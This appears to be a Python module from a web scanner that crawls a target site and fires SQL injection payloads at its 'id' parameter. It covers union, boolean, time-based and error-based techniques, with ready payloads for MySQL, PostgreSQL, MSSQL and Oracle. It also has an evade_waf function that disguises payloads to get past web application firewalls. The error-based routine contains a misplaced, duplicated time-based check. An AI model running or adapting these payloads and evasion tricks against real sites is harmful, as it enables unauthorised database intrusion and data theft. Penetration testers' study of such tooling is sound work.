import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
from payload_gen import get_sqli_payloads
from colorama import Fore, Style
import time

def get_database_specific_payloads(database_type):
    """Get database-specific payloads"""
    db_payloads = {
        'mysql': [
            "' UNION SELECT 1,2,@@version -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
            "' AND SLEEP(5) -- "
        ],
        'postgres': [
            "' UNION SELECT 1,2,version() -- ",
            "' AND (SELECT COUNT(*) FROM pg_tables) > 0 -- ",
            "' AND pg_sleep(5) -- "
        ],
        'mssql': [
            "' UNION SELECT 1,2,@@version -- ",
            "' AND (SELECT COUNT(*) FROM sys.tables) > 0 -- ",
            "' WAITFOR DELAY '00:00:05' -- "
        ],
        'oracle': [
            "' UNION SELECT 1,2,banner FROM v$version -- ",
            "' AND (SELECT COUNT(*) FROM user_tables) > 0 -- ",
            "' AND 1=dbms_pipe.receive_message('a',5) -- "
        ]
    }
    return db_payloads.get(database_type, [])

def run_sql_tests(base_url, database=None, blind=False):
    """Run SQL injection tests with optional database-specific and blind testing"""
    print(f"\n{Fore.CYAN}[*] Starting SQL injection tests on: {base_url}{Style.RESET_ALL}")
    if database:
        print(f"{Fore.CYAN}[*] Database-specific testing for: {database}{Style.RESET_ALL}")
    if blind:
        print(f"{Fore.CYAN}[*] Including blind injection techniques{Style.RESET_ALL}")

    sqli_payloads = get_sqli_payloads()
    
    # Add database-specific payloads if specified
    if database:
        db_specific = get_database_specific_payloads(database)
        sqli_payloads['database_specific'] = db_specific

    try:
        from crawler import crawl_urls
        urls = crawl_urls(base_url)
    except Exception:
        urls = [base_url]

    if not urls:
        print(f"{Fore.YELLOW}[-] No URLs found to test{Style.RESET_ALL}")
        return

    for url in urls:
        if blind:
            time_based_sqli(url, sqli_payloads)
        else:
            union_based_sqli(url, sqli_payloads)
            boolean_based_sqli(url, sqli_payloads)
            error_based_sqli(url, sqli_payloads)

def evade_waf(payload):
    return (
        payload
        .replace("UNION", "UnIoN/**/")
        .replace("SELECT", "SeLeCt/**/")
        .replace("FROM", "FrOm/**/")
        .replace("WHERE", "WhErE/**/")
        .replace("AND", "AnD/**/")
        .replace("OR", "oR/**/")
        .replace("'", "%27")
    )

def union_based_sqli(url, payloads_dict):
    for payload in payloads_dict['union']:
        evaded = evade_waf(payload)
        full_url = url.split('?')[0] + "?id=" + quote(evaded)
        print(f"{Fore.YELLOW}[Union-Based] Testing: {full_url}{Style.RESET_ALL}")
        try:
            r = requests.get(full_url, timeout=5)
            if "version()" in r.text.lower() or "sql" in r.text.lower():
                print(f"{Fore.GREEN}[+] Union-Based SQLi Possible!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def boolean_based_sqli(url, payloads_dict):
    boolean_payloads = payloads_dict.get('boolean_based', [])
    for i in range(0, len(boolean_payloads) - 1, 2):
        true_payload = boolean_payloads[i]
        false_payload = boolean_payloads[i + 1]
        evaded_true = evade_waf(true_payload)
        evaded_false = evade_waf(false_payload)
        url_true = url.split('?')[0] + "?id=" + quote(evaded_true)
        url_false = url.split('?')[0] + "?id=" + quote(evaded_false)
        try:
            r1 = requests.get(url_true, timeout=5)
            r2 = requests.get(url_false, timeout=5)
            if r1.text != r2.text:
                print(f"{Fore.GREEN}[+] Boolean-Based SQLi Detected!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def time_based_sqli(url, payloads_dict):
    blind_payloads = payloads_dict.get('blind', [])
    for payload in blind_payloads:
        if 'sleep' in payload.lower() or 'delay' in payload.lower() or 'waitfor' in payload.lower():
            evaded = evade_waf(payload)
            full_url = url.split('?')[0] + "?id=" + quote(evaded)
            print(f"{Fore.YELLOW}[Time-Based] Testing: {payload[:50]}...{Style.RESET_ALL}")
            try:
                start_time = time.time()
                r = requests.get(full_url, timeout=10)
                end_time = time.time()
                if end_time - start_time > 4:  # More than 4 seconds indicates delay
                    print(f"{Fore.GREEN}[+] Time-Based SQLi Detected!{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def error_based_sqli(url, payloads_dict):
    error_payloads = payloads_dict.get('error_based', [])
    for payload in error_payloads:
        evaded = evade_waf(payload)
        full_url = url.split('?')[0] + "?id=" + quote(evaded)
        print(f"{Fore.YELLOW}[Error-Based] Testing: {payload[:50]}...{Style.RESET_ALL}")
        try:
            r = requests.get(full_url, timeout=5)
            if any(error in r.text.lower() for error in ['error', 'mysql', 'sql', 'syntax', 'warning']):
                print(f"{Fore.GREEN}[+] Error-Based SQLi Possible!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            evaded = evade_waf(payload)
            full_url = url.split('?')[0] + "?id=" + quote(evaded)
            try:
                r = requests.get(full_url, timeout=10)
                if r.elapsed.total_seconds() > 4:
                    print(f"{Fore.GREEN}[+] Time-Based SQLi Detected!{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def old_run_sql_tests(base_url):
    """Legacy function - replaced by new run_sql_tests"""
    sqli_payloads = get_sqli_payloads()
    
    print(f"{Fore.CYAN}[*] Starting SQL Injection tests on: {base_url}{Style.RESET_ALL}\n")

    try:
        from crawler import crawl_urls
        urls = crawl_urls(base_url)
    except ImportError:
        print(f"{Fore.RED}[!] crawler.py is missing!{Style.RESET_ALL}")
        return

    if not urls:
        print(f"{Fore.YELLOW}[-] No URLs with parameters found to test.{Style.RESET_ALL}")
        return

    for url in urls:
        print(f"\n{Fore.MAGENTA}[*] Crawling and testing: {url}{Style.RESET_ALL}")
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for param in params:
            test_params = params.copy()
            test_params[param] = "'"
            test_url = f"{base}?{urlencode(test_params, doseq=True)}"
            union_based_sqli(test_url, sqli_payloads)
            boolean_based_sqli(test_url, sqli_payloads)
            time_based_sqli(test_url, sqli_payloads)
            error_based_sqli(test_url, sqli_payloads)
